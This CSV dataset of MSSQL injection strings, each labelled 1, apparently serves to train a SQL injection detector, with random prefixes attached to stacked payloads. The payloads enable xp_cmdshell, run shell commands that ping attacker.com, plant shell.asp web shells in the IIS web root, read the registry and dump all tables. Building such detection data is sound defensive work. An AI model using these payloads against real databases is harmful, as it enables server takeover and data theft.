content,label
"特点 password 52 '; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"如何 '; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"whnrum6b@'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
使用方法 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
password 449 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
6snk8c7x8@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
文办门总万信且装写响式马属元'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
"排名 page '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"际流构军斯号列少政更国音'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"优势 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"admin 教程 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"办争应名'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"评测 password 61 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"哪里买 item 85 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"jufrm@'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"item 功能 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
最新 '; EXEC sp_MSgetversion--,1
三包方写传教话然意织革导王'; EXEC sp_MSgetversion--,1
他般老提三法量个声收'; EXEC sp_MSgetversion--,1
profile 115 '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
本外真革样圆验选真'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
信权变'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
794knruthh@'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
nlwgt@'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
好不好 '; EXEC xp_cmdshell('whoami')--,1
价格 server '; EXEC xp_cmdshell('whoami')--,1
"product 使用方法 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"2024 database 68 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"mxbyxkw8@'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"意深确口次维者明都江感'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
清道万权约把根与组任发百至产选'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
按节两前毛会果问'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
tfot21t@'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
优势 '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
2024 '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
"业响克住我无当响增公号'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"ouduhvrfo0d8@'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"排名 test '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"4kgiim@'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"技价几连命此律究'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"切特成做被'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"好不好 '; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"教程 '; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"rlmbgvvxvni@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
最新 error '; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
warning 评测 '; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
hpybr@'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
油火常'; EXEC sp_who--,1
且温速品大信复断把要南证能'; EXEC sp_who--,1
password 199 '; EXEC sp_who--,1
多少钱 info 87 '; EXEC sp_who--,1
h0sz7upzpyf5@'; EXEC sp_helpdb--,1
如何 test 38 '; EXEC sp_helpdb--,1
怎么样 '; EXEC sp_helpdb--,1
admin 594 '; EXEC sp_helpdb--,1
2024 '; EXEC sp_helpdb--,1
15c16cc7dzy2@'; EXEC sp_configure--,1
3slhbnx@'; EXEC sp_configure--,1
特点 '; EXEC sp_configure--,1
"user 什么是 '; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"warning 排名 '; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"6ozvh4@'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
f9uukl3y8w@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
table 766 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
ndij3lk@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
行争件队铁容'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
"价格 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"怎么样 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"anhvu1bc1d@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"流价率较文'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"pxw5monif1@'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"断如议之'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"全标系持华区按更'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
什么是 '; EXEC sp_MSgetversion--,1
9o8cl1qubs2@'; EXEC sp_MSgetversion--,1
jb2dz967u6rd@'; EXEC sp_MSgetversion--,1
关点今规日观与圆政工又极务'; EXEC sp_MSgetversion--,1
u0k2dpsqq2xl@'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
众去构民看间区受议记'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
越议她资算办话什重图必平出术'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
学做决难数'; EXEC xp_cmdshell('whoami')--,1
2024 account 17 '; EXEC xp_cmdshell('whoami')--,1
眼你度与究'; EXEC xp_cmdshell('whoami')--,1
"如何 page 76 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"知例收约积种更权程根江养儿'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"oc1dao@'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"怎么样 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"i59ykr4kua0q@'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
什么是 '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
排名 '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
价格 fail '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
user 如何 '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
"如何 warning '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"y9u1kz2a@'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"zortx@'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"克市议了张'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"query 845 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"hobapbdp@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"y4eimm1un@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"哪里买 account 80 '; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
哪里买 fail 63 '; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
7tbj6ra@'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
业属给有拉共但标'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
6ozbdzqcfs@'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
profile 教程 '; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
对比 '; EXEC sp_who--,1
会最心积老去少确作所处段亲面许'; EXEC sp_who--,1
h7nzbc1227@'; EXEC sp_who--,1
query 579 '; EXEC sp_helpdb--,1
wfa5u72@'; EXEC sp_helpdb--,1
给济规能结部上'; EXEC sp_helpdb--,1
运指党马七性史'; EXEC sp_configure--,1
联气除量南却全它'; EXEC sp_configure--,1
w5y2o8mrg6@'; EXEC sp_configure--,1
"589335v1p@'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"多少钱 '; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"层比样中步无美很相断任东基即'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"象说毛'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
教程 server 54 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
下载 profile 56 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
eg2d3egf1@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
f7vgp93ore0r@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
"教程 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"排名 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"fail 377 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"search 什么是 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"多少钱 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"lruavugex@'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"怎么样 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
七边张领力个热特切商两联发并才'; EXEC sp_MSgetversion--,1
心热计'; EXEC sp_MSgetversion--,1
多少钱 setting '; EXEC sp_MSgetversion--,1
受布则'; EXEC sp_MSgetversion--,1
使用方法 '; EXEC sp_MSgetversion--,1
4on6b9qqm5h@'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
五治全'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
password 919 '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
怎么样 admin '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
login 401 '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
功能 '; EXEC xp_cmdshell('whoami')--,1
好不好 data 40 '; EXEC xp_cmdshell('whoami')--,1
"ujnrnt@'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"对比 test '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"从是名'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
kja39fhmyz@'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
排名 order 52 '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
warning 怎么样 '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
"法观红那状作严极约'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"profile 优势 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"system 如何 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"jr44ioc@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"iquyapqiwt@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"所养总精号'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"jromo@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"打同往金切响门'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
xfgap68r24@'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
如何 server 42 '; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
教程 setting 29 '; EXEC sp_who--,1
步公干眼把种其新号严率'; EXEC sp_who--,1
哪里买 item 98 '; EXEC sp_who--,1
cpk13svjy@'; EXEC sp_who--,1
nonj7g0zffey@'; EXEC sp_who--,1
子活段子内县'; EXEC sp_helpdb--,1
fail 972 '; EXEC sp_helpdb--,1
列民林经料导争看多区记形称'; EXEC sp_helpdb--,1
profile 320 '; EXEC sp_configure--,1
技群争满太世容放算那酸片学'; EXEC sp_configure--,1
好不好 '; EXEC sp_configure--,1
mcblhguyf1@'; EXEC sp_configure--,1
下载 '; EXEC sp_configure--,1
"最新 '; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"自属改种书'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"g6hf3mzum@'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"油得名光习调习派现活管达查入'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
素被特格进号过'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
m26777@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
query 238 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
"b5qdimq@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"yjoc68@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"user 184 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"6lk4u@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"明层展及回'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"好不好 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"v8phfdswbdip@'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"login 评测 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"k6rq9nt6p6@'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
success 606 '; EXEC sp_MSgetversion--,1
system 教程 '; EXEC sp_MSgetversion--,1
020osy@'; EXEC sp_MSgetversion--,1
login 怎么样 '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
价心中包'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
ifv1sxnmusc8@'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
住面车圆'; EXEC xp_cmdshell('whoami')--,1
1d0qim@'; EXEC xp_cmdshell('whoami')--,1
"文三元法种查带支情'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"九克运况断府想大节空界劳选等她'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"search 如何 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"下载 search 22 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
想被日段数联'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
7e617@'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
下载 item '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
政风者革文适们保对流养情经'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
xo026i@'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
"12ilfen@'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"把来该该特'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"2024 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"6cdjjrct0xan@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"使用方法 '; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"时果原布非素安养进能而书生变他'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"nt6of9y@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
什么是 test 42 '; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
道先战集手行各决'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
info 785 '; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
xy1el2@'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
ybxfvon2n@'; EXEC sp_who--,1
书何容你阶土起主数论科已线经值'; EXEC sp_who--,1
success 408 '; EXEC sp_who--,1
优势 error 21 '; EXEC sp_who--,1
什么是 '; EXEC sp_who--,1
干制现联日率而'; EXEC sp_helpdb--,1
e1iqcfjsp@'; EXEC sp_helpdb--,1
是气人四往定'; EXEC sp_helpdb--,1
推荐 info 46 '; EXEC sp_helpdb--,1
委务达可目值外力用电听子'; EXEC sp_helpdb--,1
定改社的件装听存按在国严'; EXEC sp_configure--,1
复四十日入影率质别整广示'; EXEC sp_configure--,1
评测 '; EXEC sp_configure--,1
3eduet9ct@'; EXEC sp_configure--,1
"先基采易和华周支存可转特这行动'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"product 特点 '; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"然才京正义矿价极江'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"setting 892 '; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"21oavz1a@'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
43k6u7g6cj@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
对比 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
jvdd2eywo2p@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
功能 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
"对比 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"王和时产'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"声术千构写往常料置见'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"jmee05cp@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"什程那该第权集规'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"至如但总因识人段运增各复件'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"特点 order 96 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"没类精式南易院总委况'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
教程 '; EXEC sp_MSgetversion--,1
zw1mit4tvfn@'; EXEC sp_MSgetversion--,1
e8ipi9@'; EXEC sp_MSgetversion--,1
特点 '; EXEC sp_MSgetversion--,1
prrgli@'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
使用方法 '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
q5pxw5ju@'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
success 教程 '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
warning 对比 '; EXEC xp_cmdshell('whoami')--,1
统并产想报科查认列备深'; EXEC xp_cmdshell('whoami')--,1
2024 '; EXEC xp_cmdshell('whoami')--,1
如为采治'; EXEC xp_cmdshell('whoami')--,1
"教程 fail '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"如何 login 78 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"即处大'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
统属通装打间土见那'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
server 766 '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
s927zw1gy@'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
"login 最新 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"好不好 item '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"好不好 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"对比 '; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
